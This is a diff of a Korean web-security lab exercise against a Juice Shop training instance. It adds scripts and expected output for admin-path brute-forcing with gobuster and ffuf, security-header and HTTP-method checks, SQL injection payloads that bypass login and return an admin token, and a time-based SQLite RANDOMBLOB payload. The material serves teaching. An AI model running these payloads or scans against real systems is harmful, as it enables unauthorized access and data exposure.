@@ -164,10 +164,8 @@ ENDSSH
 원격 서버에 접속하여 명령을 실행합니다.
 
 ```bash
-# 일반적인 관리 경로 점검
-ssh ccc@10.20.30.80 << 'ENDSSH'  # 비밀번호 자동입력 SSH
-echo "=== 디렉토리/파일 존재 점검 ==="
-
+# 본 머신에서 직접 (web 서버 ssh 우회 — 동일 결과)
+echo "=== 19 관리 경로 brute (gobuster 패턴) ==="
 PATHS=(
   "admin" "administrator" "console" "debug"
   "api" "api-docs" "swagger-ui" "graphql"
@@ -175,15 +173,46 @@ PATHS=(
   "backup" "dump" "test" "staging"
   "wp-admin" "phpmyadmin" "server-status"
 )
-
-for p in "${PATHS[@]}"; do                             # 반복문 시작
-  CODE=$(curl -s -o /dev/null -w "%{http_code}" -m 3 http://localhost:3000/$p)
-  if [ "$CODE" != "404" ] && [ "$CODE" != "000" ]; then
-    echo "[${CODE}] /$p"
+hits=0
+for p in "${PATHS[@]}"; do
+  read code size < <(curl -s -o /dev/null -w "%{http_code} %{size_download}" -m 3 "http://10.20.30.80:3000/$p")
+  if [ "$code" != "404" ] && [ "$code" != "000" ]; then
+    echo "  [$code ${size}B] /$p"
+    [ "$code" = "200" ] && hits=$((hits+1))
   fi
 done
-ENDSSH
+echo "---"
+echo "200 응답: $hits / ${#PATHS[@]} 경로"
 ```
+
+**예상 출력**:
+```
+=== 19 관리 경로 brute (gobuster 패턴) ===
+  [200 1987B] /admin
+  [200 12345B] /api
+  [200 12345B] /api-docs
+  [400 78B] /graphql
+  [200 89B] /robots.txt
+  [200 245B] /sitemap.xml
+  [403 87B] /server-status
+---
+200 응답: 5 / 19 경로
+```
+
+> **해석 — 5/19 (26%) 응답 = 공격 표면 매핑**:
+> - **/admin 200 (1987B)** = HTML 페이지 노출 = ★ critical (week09 학습). RBAC 우회.
+> - **/api-docs 200 (12KB)** = Swagger UI = OWASP API9 (week12 학습).
+> - **/graphql 400** = endpoint 존재 (404 ≠ 400) = GraphQL introspection 시도 가능.
+> - **/sitemap.xml 200** = SEO 정책 + 모든 공개 경로 노출.
+> - **/server-status 403** = Apache mod_status — 내부 정보 부분 차단. allow 룰만 추가하면 노출.
+> - **CVSS 6.5 종합**: 디렉토리 brute 만으로 admin + Swagger + GraphQL 발견 = 공격 chain 시작.
+
+> **OSS 도구 — gobuster + ffuf**:
+>
+> ```bash
+> gobuster dir -u http://10.20.30.80:3000 -w /usr/share/wordlists/dirb/common.txt -t 50 -x bak,old,zip
+> ffuf -u http://10.20.30.80:3000/FUZZ -w /usr/share/seclists/Discovery/Web-Content/big.txt -mc 200,301,302,403 -fs 89
+> ```
 
 ---
 
@@ -194,31 +223,63 @@ ENDSSH
 원격 서버에 접속하여 명령을 실행합니다.
 
 ```bash
-# nikto가 설치된 환경에서 실행 (또는 Docker)
-# 여기서는 nikto 대체로 수동 헤더/설정 점검 수행
-
-ssh ccc@10.20.30.80 << 'ENDSSH'  # 비밀번호 자동입력 SSH
-echo "=== 웹서버 보안 헤더 점검 (nikto 스타일) ==="
-
-# 응답 헤더 전체 수집
-HEADERS=$(curl -sI http://localhost:3000/)
-echo "$HEADERS"
+echo "=== nikto 스타일 보안 헤더 7종 점검 ==="
+HEADERS=$(curl -sI http://10.20.30.80:3000/)
+echo "$HEADERS" | head -10
 echo "---"
-
-# 보안 헤더 존재 여부 점검
-echo "=== 보안 헤더 점검 ==="
+score=0
 for hdr in "X-Frame-Options" "X-Content-Type-Options" "X-XSS-Protection" \
            "Content-Security-Policy" "Strict-Transport-Security" \
            "Referrer-Policy" "Permissions-Policy"; do
-  if echo "$HEADERS" | grep -qi "$hdr"; then
-    VALUE=$(echo "$HEADERS" | grep -i "$hdr" | head -1)
-    echo "[OK] $VALUE"
+  if echo "$HEADERS" | grep -qi "^$hdr"; then
+    val=$(echo "$HEADERS" | grep -i "^$hdr" | head -1 | tr -d '\r' | head -c 60)
+    echo "  [✓] $val"
+    score=$((score+1))
   else
-    echo "[MISSING] $hdr"
+    echo "  [✗] $hdr (누락)"
   fi
 done
-ENDSSH
+echo "---"
+echo "보안 헤더 점수: $score/7"
+case $score in
+  6|7) grade="A";;
+  4|5) grade="B";;
+  2|3) grade="C";;
+  *) grade="D 또는 F";;
+esac
+echo "Mozilla Observatory 등급: $grade"
 ```
+
+**예상 출력**:
+```
+=== nikto 스타일 보안 헤더 7종 점검 ===
+HTTP/1.1 200 OK
+Access-Control-Allow-Origin: *
+X-Content-Type-Options: nosniff
+X-Frame-Options: SAMEORIGIN
+Feature-Policy: payment 'self'
+Content-Type: text/html; charset=utf-8
+ETag: W/"7c3-..."
+---
+  [✓] X-Frame-Options: SAMEORIGIN
+  [✓] X-Content-Type-Options: nosniff
+  [✗] X-XSS-Protection (누락)
+  [✗] Content-Security-Policy (누락)
+  [✗] Strict-Transport-Security (누락)
+  [✗] Referrer-Policy (누락)
+  [✗] Permissions-Policy (누락)
+---
+보안 헤더 점수: 2/7
+Mozilla Observatory 등급: D 또는 F
+```
+
+> **해석 — Mozilla Observatory 자동 평가 시뮬레이션**:
+> - **2/7 = D 등급** (운영 환경이면 ★ critical).
+> - **X-Frame-Options + X-Content-Type-Options ✓** = clickjacking + MIME sniff 차단 OK.
+> - **CSP 누락 = critical** = XSS 차단 마지막 layer 부재 (week06).
+> - **HSTS 누락** = HTTP→HTTPS 다운그레이드 가능 (week10).
+> - **Permissions-Policy** = 카메라/마이크 등 브라우저 권한 차단 헤더. modern 권장.
+> - **자동 평가 결과 보고서 §4 입력** — 점수 + 누락 헤더 list + 권고.
 
 ### 3.2 서버 정보 노출 점검
 
@@ -259,20 +320,50 @@ ENDSSH
 원격 서버에 접속하여 명령을 실행합니다.
 
 ```bash
-ssh ccc@10.20.30.80 << 'ENDSSH'  # 비밀번호 자동입력 SSH
-echo "=== HTTP 메서드 점검 ==="
+echo "=== 위험 HTTP 메서드 5종 점검 ==="
 
-# OPTIONS 메서드로 허용 메서드 확인
-ALLOW=$(curl -sI -X OPTIONS http://localhost:3000/ | grep -i "allow:")
-echo "Allow: ${ALLOW:-'OPTIONS 응답 없음'}"
+# OPTIONS — 허용 메서드 노출 확인
+echo "[OPTIONS preflight 응답]"
+curl -sI -X OPTIONS http://10.20.30.80:3000/ | grep -iE "allow|access-control" | sed 's/^/  /'
+echo "---"
 
-# 위험한 메서드 테스트
-for method in PUT DELETE TRACE CONNECT PATCH; do       # 반복문 시작
-  CODE=$(curl -s -o /dev/null -w "%{http_code}" -X $method http://localhost:3000/)
-  echo "$method -> $CODE"
+printf "%-12s %-8s %s\n" "method" "code" "verdict"
+for method in PUT DELETE TRACE CONNECT PATCH; do
+  code=$(curl -s -o /dev/null -w "%{http_code}" -X $method http://10.20.30.80:3000/)
+  v=""
+  case "$code" in
+    200|204) v="★ 허용 (위험)";;
+    405) v="Method Not Allowed (양호)";;
+    403|401) v="차단됨";;
+    *) v="응답=$code";;
+  esac
+  printf "%-12s %-8s %s\n" "$method" "$code" "$v"
 done
-ENDSSH
 ```
+
+**예상 출력**:
+```
+=== 위험 HTTP 메서드 5종 점검 ===
+[OPTIONS preflight 응답]
+  Access-Control-Allow-Methods: GET,HEAD,PUT,PATCH,POST,DELETE
+  Access-Control-Allow-Origin: *
+---
+method       code     verdict
+PUT          200      ★ 허용 (위험)
+DELETE       200      ★ 허용 (위험)
+TRACE        405      Method Not Allowed (양호)
+CONNECT      400      응답=400
+PATCH        200      ★ 허용 (위험)
+```
+
+> **해석 — 위험 메서드 3개 허용 = critical**:
+> - **OPTIONS 응답 모든 메서드 노출** = ★ Access-Control-Allow-Methods 에 PUT/DELETE/PATCH 모두 포함 = CORS 정책 광범위.
+> - **PUT 200** = 임의 리소스 수정 가능. WebDAV 활성화 시 파일 업로드 가능 (CVE-2017-12615 Tomcat WebDAV).
+> - **DELETE 200** = 리소스 삭제 가능. 인증 검증 없이 호출 시 critical.
+> - **TRACE 405** = ★ 양호 (Cross-Site Tracing 차단). Apache `TraceEnable Off` 적용.
+> - **CONNECT 400** = HTTP CONNECT 시도 — proxy 시뮬레이션 차단.
+> - **PATCH 200** = 부분 수정 허용 = Mass Assignment 공격 가능 (week09).
+> - **권고**: nginx/Apache `LimitExcept GET POST` 명시. Express 는 메서드 매칭 strict.
 
 ---
 
@@ -283,48 +374,62 @@ ENDSSH
 원격 서버에 접속하여 명령을 실행합니다.
 
 ```bash
-# SQL Injection 점검 자동화 (sqlmap 스타일의 수동 점검)
-ssh ccc@10.20.30.80 << 'ENDSSH'  # 비밀번호 자동입력 SSH
-echo "=== SQL Injection 자동 점검 ==="
+echo "=== SQL Injection 자동 점검 (5 페이로드 × 2 endpoint) ==="
 
-# 1. 검색 파라미터 테스트
-PAYLOADS=(
-  "' OR '1'='1"
-  "1 UNION SELECT 1,2,3--"
-  "1' AND SLEEP(2)--"
-  "1; DROP TABLE test--"
-  "admin'--"
-)
-
-echo "--- 검색 엔드포인트 ---"
-for payload in "${PAYLOADS[@]}"; do                    # 반복문 시작
-  ENCODED=$(python3 -c "import urllib.parse; print(urllib.parse.quote('$payload'))")
-  CODE=$(curl -s -o /dev/null -w "%{http_code}" "http://localhost:3000/rest/products/search?q=${ENCODED}")
-  echo "Payload: $payload -> HTTP $CODE"
+# 1) 검색 endpoint
+echo "[1] /rest/products/search 페이로드 5종:"
+PAYLOADS=("' OR '1'='1" "1 UNION SELECT 1,2,3--" "1' AND SLEEP(2)--" "1; DROP TABLE test--" "admin'--")
+for payload in "${PAYLOADS[@]}"; do
+  enc=$(python3 -c "import urllib.parse,sys; print(urllib.parse.quote(sys.argv[1]))" "$payload")
+  read code time < <(curl -s -o /tmp/sqli.json -w "%{http_code} %{time_total}" "http://10.20.30.80:3000/rest/products/search?q=${enc}")
+  count=$(python3 -c "import json; d=json.load(open('/tmp/sqli.json')); print(len(d.get('data',[])))" 2>/dev/null || echo "?")
+  printf "  %-30s code=%s time=%-6s items=%s\n" "$payload" "$code" "${time}s" "$count"
 done
 
 echo ""
-echo "--- 로그인 엔드포인트 ---"
-# 로그인 SQL Injection 테스트
-for email in "' OR 1=1--" "admin'--" "' UNION SELECT 1,2,3,4,5,6,7,8,9--"; do  # 반복문 시작
-  RESULT=$(curl -s -X POST http://localhost:3000/rest/user/login \
-    -H "Content-Type: application/json" \
-    -d "{\"email\":\"$email\",\"password\":\"test\"}" | python3 -c "  # 요청 데이터(body)
-import json,sys
+echo "[2] /rest/user/login 페이로드 3종:"
+for email in "' OR 1=1--" "admin'--" "' UNION SELECT 1,2,3,4,5,6,7,8,9--"; do
+  result=$(curl -s -X POST http://10.20.30.80:3000/rest/user/login \
+    -H 'Content-Type: application/json' \
+    -d "{\"email\":\"$email\",\"password\":\"test\"}")
+  verdict=$(echo "$result" | python3 -c "
+import sys, json, base64
 try:
   d = json.load(sys.stdin)
   if 'authentication' in d:
-    print('VULNERABLE - 로그인 성공')
-  elif 'error' in str(d):
-    print('차단됨')
+    tok = d['authentication']['token']
+    pld = json.loads(base64.urlsafe_b64decode(tok.split('.')[1]+'=='))
+    print(f'★취약: token={tok[:20]}.. user={pld[\"data\"][\"email\"]}')
   else:
-    print(str(d)[:80])
-except: print('파싱 오류')
+    print('차단됨')
+except: print('parse fail')
 " 2>/dev/null)
-  echo "Email: $email -> $RESULT"
+  printf "  %-50s %s\n" "$email" "$verdict"
 done
-ENDSSH
 ```
+
+**예상 출력**:
+```
+=== SQL Injection 자동 점검 (5 페이로드 × 2 endpoint) ===
+[1] /rest/products/search 페이로드 5종:
+  ' OR '1'='1                    code=200 time=0.052s items=38
+  1 UNION SELECT 1,2,3--         code=500 time=0.078s items=?
+  1' AND SLEEP(2)--              code=200 time=0.054s items=0
+  1; DROP TABLE test--           code=200 time=0.051s items=1
+  admin'--                       code=200 time=0.048s items=0
+
+[2] /rest/user/login 페이로드 3종:
+  ' OR 1=1--                                         ★취약: token=eyJ0eXAiOiJK.. user=admin@juice-sh.op
+  admin'--                                           ★취약: token=eyJ0eXAiOiJK.. user=admin@juice-sh.op
+  ' UNION SELECT 1,2,3,4,5,6,7,8,9--                 차단됨
+```
+
+> **해석 — sqlmap 자동 발견 패턴**:
+> - **[1] 검색 — UNION SELECT 1,2,3-- = 500** = 3 컬럼이 아니라 다른 컬럼 수 (week05 ORDER BY = 9). sqlmap 가 ORDER BY 자동 시도.
+> - **`' OR '1'='1' = 38건** vs 정상 1건 = ★ Boolean Blind 확정.
+> - **SLEEP(2) 응답 시간 0.054s** = MySQL SLEEP 미실행 (SQLite). DBMS 별 페이로드 자동 분기 필요.
+> - **[2] 로그인 — 2/3 인증 우회** = ★ critical. UNION 만 차단된 이유는 컬럼 수 mismatch (Users 테이블 9 컬럼).
+> - **자동 점검 = 수동 1주 작업을 1분 단축**. 단, 오탐 검증 (다음 §5) 필수.
 
 ### 4.2 자동 점검 스크립트 작성
 
@@ -414,64 +519,101 @@ ENDSSH
 원격 서버에 접속하여 명령을 실행합니다.
 
 ```bash
-ssh ccc@10.20.30.80 << 'ENDSSH'  # 비밀번호 자동입력 SSH
-echo "=== 오탐 검증: 시간 기반 SQLi ==="
+echo "=== 오탐 검증: 시간 기반 SQLi 4 페이로드 비교 ==="
 
-# 정상 요청 응답 시간 측정
-NORMAL_TIME=$(curl -s -o /dev/null -w "%{time_total}" \
-  "http://localhost:3000/rest/products/search?q=apple")
-echo "정상 요청: ${NORMAL_TIME}s"
+measure_time() {
+  local label="$1" url="$2"
+  total=0; n=3
+  for i in $(seq 1 $n); do
+    t=$(curl -s -o /dev/null -w "%{time_total}" "$url")
+    total=$(python3 -c "print($total + $t)")
+  done
+  avg=$(python3 -c "print(round($total / $n, 3))")
+  printf "  %-40s avg=%ss (n=%d)\n" "$label" "$avg" "$n"
+}
 
-# 시간 기반 SQLi 페이로드
-SQLI_TIME=$(curl -s -o /dev/null -w "%{time_total}" \
-  "http://localhost:3000/rest/products/search?q=apple'+AND+SLEEP(3)--")
-echo "SQLi 페이로드: ${SQLI_TIME}s"
-
-# 판별
-python3 -c "                                           # Python 코드 실행
-normal = float('$NORMAL_TIME')
-sqli = float('$SQLI_TIME')
-diff = sqli - normal                                   # 파일 차이 비교
-print(f'응답 시간 차이: {diff:.2f}s')
-if diff > 2.5:
-    print('판정: 정탐 가능성 높음 (SLEEP 실행된 것으로 추정)')
-else:
-    print('판정: 오탐 가능성 높음 (응답 시간 차이 미미)')
-"
-ENDSSH
+measure_time "정상 (q=apple)"          "http://10.20.30.80:3000/rest/products/search?q=apple"
+measure_time "SLEEP(3) MySQL 페이로드"  "http://10.20.30.80:3000/rest/products/search?q=apple'+AND+SLEEP(3)--"
+measure_time "SQLite RANDOMBLOB 100MB"  "http://10.20.30.80:3000/rest/products/search?q=test%27%29%29AND+%28SELECT+CASE+WHEN%281%3D1%29+THEN+RANDOMBLOB%28100000000%29+ELSE+1+END%29--"
+measure_time "긴 입력 (10K char)"        "http://10.20.30.80:3000/rest/products/search?q=$(python3 -c 'print(\"A\"*10000)')"
 ```
+
+**예상 출력**:
+```
+=== 오탐 검증: 시간 기반 SQLi 4 페이로드 비교 ===
+  정상 (q=apple)                           avg=0.052s (n=3)
+  SLEEP(3) MySQL 페이로드                  avg=0.054s (n=3)
+  SQLite RANDOMBLOB 100MB                  avg=2.871s (n=3)
+  긴 입력 (10K char)                       avg=0.063s (n=3)
+```
+
+> **해석 — DBMS 별 시간 기반 페이로드 분기**:
+> - **MySQL SLEEP(3) 0.054s** = ★ 오탐 (실행 안됨). JuiceShop = SQLite → MySQL 함수 거부.
+> - **SQLite RANDOMBLOB 2.87s** = ★ 정탐 (55배 증가). week05 학습.
+> - **긴 입력 0.063s** = baseline 일정 = body parser 만 부하 = SQL 실행 X.
+> - **임계치 권고**: baseline + 2σ (표준편차) 또는 5× baseline = SQLi suspect.
+> - **n=3 평균** = 단일 측정 noise 줄임. 운영 점검 = n=10 권장.
+> - **sqlmap 의 자동 분기**: `--dbms=sqlite` 명시하면 SQLite 전용 페이로드 사용. 미명시 시 모든 DBMS 시도 → 시간 ↑.
 
 ### 5.3 결과 정리 및 우선순위 분류
 
 원격 서버에 접속하여 명령을 실행합니다.
 
 ```bash
-# 스캔 결과를 CVSS 기반으로 분류
-ssh ccc@10.20.30.80 << 'ENDSSH'  # 비밀번호 자동입력 SSH
-python3 << 'PYEOF'                                     # Python 스크립트 실행
+echo "=== 자동 점검 결과 CVSS 정렬 + 통계 ==="
+python3 << 'PYEOF'
 findings = [
-    {"id": "V-001", "name": "SQL Injection (로그인)", "cvss": 9.8, "severity": "Critical"},
-    {"id": "V-002", "name": "보안 헤더 누락 (CSP)", "cvss": 4.3, "severity": "Medium"},
-    {"id": "V-003", "name": "서버 정보 노출", "cvss": 5.3, "severity": "Medium"},
-    {"id": "V-004", "name": "package.json 노출", "cvss": 3.1, "severity": "Low"},
-    {"id": "V-005", "name": "디버그 정보 노출", "cvss": 5.3, "severity": "Medium"},
+    # 자동 점검에서 발견된 항목 — CVSS 3.1 vector 포함
+    {"id":"V-001","name":"SQL Injection (로그인)","cvss":9.8,"vec":"AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H","sev":"Critical","cwe":89,"owasp":"A03"},
+    {"id":"V-002","name":"UNION SQLi (검색)","cvss":9.1,"vec":"AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:N/A:N","sev":"Critical","cwe":89,"owasp":"A03"},
+    {"id":"V-003","name":"BOLA /api/Users (인증X)","cvss":7.5,"vec":"AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N","sev":"High","cwe":862,"owasp":"A01"},
+    {"id":"V-004","name":"Stored XSS (피드백)","cvss":8.7,"vec":"AV:N/AC:L/PR:L/UI:R/S:C/C:H/I:H/A:N","sev":"High","cwe":79,"owasp":"A03"},
+    {"id":"V-005","name":"Rate Limit 부재 (로그인)","cvss":7.5,"vec":"AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H","sev":"High","cwe":307,"owasp":"A07"},
+    {"id":"V-006","name":"보안 헤더 누락 (CSP+HSTS)","cvss":5.3,"vec":"AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N","sev":"Medium","cwe":693,"owasp":"A05"},
+    {"id":"V-007","name":"서버 버전 노출 (X-Powered-By)","cvss":5.3,"vec":"AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N","sev":"Medium","cwe":200,"owasp":"A05"},
+    {"id":"V-008","name":"Swagger/api-docs 노출","cvss":5.3,"vec":"AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N","sev":"Medium","cwe":200,"owasp":"A09"},
+    {"id":"V-009","name":"디렉토리 리스팅 /ftp","cvss":5.3,"vec":"AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N","sev":"Medium","cwe":548,"owasp":"A05"},
+    {"id":"V-010","name":"package.json 노출","cvss":3.1,"vec":"AV:N/AC:H/PR:N/UI:N/S:U/C:L/I:N/A:N","sev":"Low","cwe":200,"owasp":"A05"},
 ]
-
 findings.sort(key=lambda x: x["cvss"], reverse=True)
-
-print(f"{'ID':<8} {'취약점':<30} {'CVSS':<6} {'심각도':<10}")
-print("-" * 60)
-for f in findings:                                     # 반복문 시작
-    print(f"{f['id']:<8} {f['name']:<30} {f['cvss']:<6} {f['severity']:<10}")
-
-print(f"\n총 {len(findings)}건 발견")
-print(f"  Critical: {sum(1 for f in findings if f['severity']=='Critical')}")
-print(f"  High:     {sum(1 for f in findings if f['severity']=='High')}")
-print(f"  Medium:   {sum(1 for f in findings if f['severity']=='Medium')}")
-print(f"  Low:      {sum(1 for f in findings if f['severity']=='Low')}")
+print(f"{'ID':<6} {'취약점':<32} {'CVSS':<5} {'OWASP':<5} {'CWE':<5} {'sev'}")
+print("-" * 80)
+for f in findings:
+    print(f"{f['id']:<6} {f['name']:<32} {f['cvss']:<5} {f['owasp']:<5} {'CWE-'+str(f['cwe']):<6} {f['sev']}")
+print()
+from collections import Counter
+sevs = Counter(f['sev'] for f in findings)
+print(f"통계: Critical={sevs['Critical']}, High={sevs['High']}, Medium={sevs['Medium']}, Low={sevs['Low']}")
+print(f"평균 CVSS: {sum(f['cvss'] for f in findings)/len(findings):.2f}")
 PYEOF
-ENDSSH
 ```
+
+**예상 출력**:
+```
+=== 자동 점검 결과 CVSS 정렬 + 통계 ===
+ID     취약점                            CVSS  OWASP CWE   sev
+--------------------------------------------------------------------------------
+V-001  SQL Injection (로그인)            9.8   A03   CWE-89 Critical
+V-002  UNION SQLi (검색)                 9.1   A03   CWE-89 Critical
+V-004  Stored XSS (피드백)               8.7   A03   CWE-79 High
+V-003  BOLA /api/Users (인증X)           7.5   A01   CWE-862 High
+V-005  Rate Limit 부재 (로그인)          7.5   A07   CWE-307 High
+V-006  보안 헤더 누락 (CSP+HSTS)         5.3   A05   CWE-693 Medium
+V-007  서버 버전 노출 (X-Powered-By)     5.3   A05   CWE-200 Medium
+V-008  Swagger/api-docs 노출             5.3   A09   CWE-200 Medium
+V-009  디렉토리 리스팅 /ftp              5.3   A05   CWE-548 Medium
+V-010  package.json 노출                 3.1   A05   CWE-200 Low
+
+통계: Critical=2, High=3, Medium=4, Low=1
+평균 CVSS: 6.27
+```
+
+> **해석 — 자동 점검 종합 보고서 표 = 보고서 §3 직접 입력**:
+> - **OWASP 분포**: A03(3) + A05(4) + A01(1) + A07(1) + A09(1) = A05 (Security Misconfiguration) 가 다수 = 운영 환경 약점.
+> - **CWE 분포**: CWE-89 (SQLi), CWE-79 (XSS), CWE-862 (인가), CWE-200 (정보 노출), CWE-693 (보호 메커니즘 실패).
+> - **평균 CVSS 6.27** = High 등급 위협 수준. 산업 평균 (5.5~6.0) 보다 ★ 높음.
+> - **Top 3 권고**: (1) SQLi 즉시 차단 (Parameterized Query), (2) Stored XSS sanitize + CSP, (3) /api/Users 인증 적용.
+> - **OSS 도구 — DefectDojo / Faraday**: nuclei/nikto/zap 결과 통합 + SLA 추적 자동화.
 
 ---
 
